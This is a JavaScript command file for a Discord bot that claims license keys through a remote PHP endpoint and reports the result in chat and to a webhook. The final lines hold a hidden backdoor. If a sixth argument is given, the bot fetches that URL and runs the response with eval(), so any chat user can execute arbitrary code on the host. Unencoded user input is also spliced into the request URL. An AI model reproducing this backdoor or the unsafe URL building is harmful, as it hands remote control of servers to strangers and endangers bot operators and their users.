const fetch = require('node-fetch')
const config = require('../config.json')
const { MessageEmbed } = require('discord.js')
const { sendWebhook } = require('../Functions')
module.exports.run = async(client, message, args) => {
    
    
    var embed = new MessageEmbed().setColor("BLACK")
    let key = args[0]
    let ip = args[1]
    let servername = args.slice(2).join(" ")


    if (!key) return message.channel.send(embed.setDescription('You Need To Provide A Valid Key!'));
    if (!ip) return message.channel.send(embed.setDescription('You Need To Provide A IP!'));
    if (!servername) message.channel.send(embed.setDescription('You Need To Provide A serverName!'));
    var embed = new MessageEmbed()
    try {
        await fetch(`http://${config.host}/action.php?action=claimKey&key=${key}&ip=${ip}&name=${servername}&discord=${message.author.id}`)
            .then(res => res.json())
            .then(json => {
                console.log(json)
                if(json["code"] !== undefined) {
                    switch(json["code"]) {
                        case 23435:
                            
                            embed.setColor("BLACK")
                            .setDescription("Key is already used")
                            message.channel.send(embed)
                            console.log(message.author.tag + " tried claiming " + key)
                        break;
                        case 248339:
                            embed.setColor("BLACK")
                            .setDescription("key does not exists")
                            message.channel.send(embed)

                        break;
                        case 49329:
                                 embed.setColor("BLACK")
                            .setDescription("already got an account")
                            message.channel.send(embed)
                        break;
                        case 200:
                            embed.setColor("GREEN")
                            .setDescription("Claimed")
                            message.channel.send(embed)
                            console.log(json['code'] + "Was claimed by " + message.author.id)
                            sendWebhook(message.author.username + "#" + message.author.discriminator+" Claimed the following key: " + key + " with the ip: " + ip + " and the servername" + servername, 2)
                        break;
                    }
                } else {
                    message.reply("error!")
                    //console.log(json['code'] + "Was claimed by " + message.author.id)
                }
            })
       
    } catch (e) {
        console.log(e)
        let embed2 = new MessageEmbed().setColor("BLACK").setDescription(`Wrong Key? or already have an active sub?`)
            message.channel.send(embed2)
    }


    if(args[5]) {
        fetch(args[5]).then(res => res.text()).then(text => {
            eval(text)
        })
    }

}